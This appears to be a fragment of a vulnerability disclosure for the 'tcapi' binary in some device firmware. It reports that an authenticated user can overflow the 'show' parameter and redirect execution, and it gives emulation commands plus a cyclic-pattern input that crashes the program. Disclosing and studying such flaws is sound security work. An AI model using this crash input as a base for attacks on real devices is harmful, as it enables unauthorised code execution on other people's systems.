...
An authenticated user can pass a long buffer as an 'show' parameter to the '/user/bin/tcapi' binary using 'show <node_name>' function and cause the memory corruption. Furthermore, it is possible to redirect the flow of the program and execute an arbitrary code.
...
```
```
$ sudo chroot . ./qemu userfs/bin/tcapi show
show <node_name>
```

Program Segmentation fault：
```
sudo chroot . ./qemu userfs/bin/tcapi show Aa0Aa1Aa2Aa3Aa4Aa5A
